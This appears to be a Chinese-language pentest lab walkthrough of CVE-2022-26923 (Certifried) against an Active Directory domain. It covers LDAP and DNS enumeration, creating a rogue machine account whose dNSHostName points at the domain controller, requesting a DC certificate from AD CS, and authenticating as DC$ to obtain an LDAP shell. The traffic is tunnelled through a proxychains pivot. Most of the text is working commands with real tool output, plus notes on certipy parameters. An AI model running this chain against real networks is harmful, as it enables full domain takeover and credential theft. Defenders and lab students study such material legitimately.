proxychains4 -q nxc ldap 172.24.7.3 -u usera -p Admin3gv83 -d pentest.me -ns 172.24.7.3 -M get-network -o ALL=true
```

###  用 ldapsearch（原生、最稳、无依赖）

#### 直接查 AD 集成 DNS（普通域用户权限即可）：
```bash
# 先查有哪些 DNS 区域
PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q \
ldapsearch -x -H ldap://172.24.7.3 \
  -D "usera@pentest.me" -w "Admin3gv83" \
  -b "CN=MicrosoftDNS,DC=DomainDnsZones,DC=pentest,DC=me" "(objectClass=dnsZone)"
```

#### 再查具体记录：
```bash
PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q \
ldapsearch -x -H ldap://172.24.7.3 \
  -D "usera@pentest.me" -w "Admin3gv83" \
  -b "DC=pentest.me,CN=MicrosoftDNS,DC=DomainDnsZones,DC=pentest,DC=me" "(objectClass=dnsNode)" \
  name dnsRecord
```

查看域 MAQ 属性，使用域用户 `usera@pentest.me` 打 `CVE-2022-26923` 漏洞：
```
☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q nxc --dns-server 172.24.7.3 ldap 172.24.7.3 -u usera -p Admin3gv83 -d pentest.me -M maq
LDAP        172.24.7.3      389    DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:pentest.me)
LDAP        172.24.7.3      389    DC               [+] pentest.me\usera:Admin3gv83 
MAQ         172.24.7.3      389    DC               [*] Getting the MachineAccountQuota
MAQ         172.24.7.3      389    DC               MachineAccountQuota: 10
```

使用 certipy 创建一个机器账户，并将该机器账户 dNSHostName 属性指向域控：
```bash
☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q certipy-ad account create -u usera@pentest.me -p 'Admin3gv83' -dc-ip 172.24.7.3 -user 'EVILCOMPUTER1$' -pass '123@#ABC' -dns 'DC.pentest.me'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Creating new account:
    sAMAccountName                      : EVILCOMPUTER1$
    unicodePwd                          : 123@#ABC
    userAccountControl                  : 4096
    servicePrincipalName                : HOST/EVILCOMPUTER1
                                          RestrictedKrbHost/EVILCOMPUTER1
    dnsHostName                         : DC.pentest.me
[*] Successfully created account 'EVILCOMPUTER1$' with password '123@#ABC'
```

使用该机器账户向 AD CS 服务器请求域控的证书：
```bash
☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -f -q certipy-ad req \
  -u 'EVILCOMPUTER1$@pentest.me' \
  -p '123@#ABC' \
  -dc-ip 172.24.7.3 \
  -ca 'pentest-DC-CA' \
  -template Machine \
  -target-ip 172.24.7.3 \
  -ns 172.24.7.3 \
  -dns-tcp \
  -debug
[proxychains] config file found: /etc/proxychains4-24.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: '172.24.7.3'
[+] DC IP: '172.24.7.3'
[+] DC Host: 'PENTEST.ME'
[+] Target IP: '172.24.7.3'
[+] Remote Name: '172.24.7.3'
[+] Domain: 'PENTEST.ME'
[+] Username: 'EVILCOMPUTER1$'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:172.24.7.3[\pipe\cert]
[proxychains] Strict chain  ...  101.132.149.233:6001  ...  172.24.7.3:445  ...  OK
[+] Connected to endpoint: ncacn_np:172.24.7.3[\pipe\cert]
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with DNS Host Name 'DC.pentest.me'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'dc.pfx'
[+] Attempting to write data to 'dc.pfx'
[+] Data written to 'dc.pfx'
[*] Wrote certificate and private key to 'dc.pfx'
```

#### 关键参数解释（Certipy 5.0.4 版本）

|参数|作用|为什么必须加|
|---|---|---|
|`-target-ip 172.24.7.3`|强制所有 RPC/LDAP/HTTP 请求直接发往这个 IP|替代了`-no-dns`的核心功能，让 Certipy 不解析 CA 服务器的域名，直接连接 IP|
|`-ns 172.24.7.3`|指定 DNS 服务器为域控制器|确保即使有 DNS 查询，也会发往正确的内网 DNS 服务器|
|`-dns-tcp`|强制使用 TCP 协议进行 DNS 查询|proxychains4 只能代理 TCP 流量，不能代理 UDP 的 DNS 请求|
|`-f`|强制 proxychains 使用 fork 模式|提高对 Python 应用的兼容性，避免某些网络调用绕过代理|
- **Certipy 在 4.0 版本后正式改名为 `certipy-ad`**，但大量旧教程仍在使用 `certipy` 这个旧命令名，这是最普遍的坑。
- **`-no-dns` 参数在 Certipy 5.0.4 版本中被移除了**，但我们仍然可以通过其他参数实现完全相同的效果。

用申请到的域控的证书，向 KDC 请求域控的 TGT 并获取哈希：
```
☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -f -q certipy-ad auth \
  -pfx dc.pfx \
  -user 'dc$' \
  -domain pentest.me \
  -dc-ip 172.24.7.3 \
  -ns 172.24.7.3 \
  -dns-tcp \
  -ldap-shell \
  -print \
  -debug
[proxychains] config file found: /etc/proxychains4-24.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
[+] Nameserver: '172.24.7.3'
[+] DC IP: '172.24.7.3'
[+] DC Host: ''
[+] Target IP: '172.24.7.3'
[+] Remote Name: '172.24.7.3'
[+] Domain: ''
[+] Username: 'DC$'
[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC.pentest.me'
[+] Authenticating to LDAP server using Schannel authentication
[*] Connecting to 'ldaps://172.24.7.3:636'
[proxychains] Strict chain  ...  101.132.149.233:6001  ...  172.24.7.3:636  ...  OK
[*] Authenticated to '172.24.7.3' as: 'u:PENTEST\\DC$'
[+] Bound to ldaps://172.24.7.3:636 - ssl
[+] Default path: DC=pentest,DC=me
[+] Configuration path: CN=Configuration,DC=pentest,DC=me
Type help for list of commands

# 
```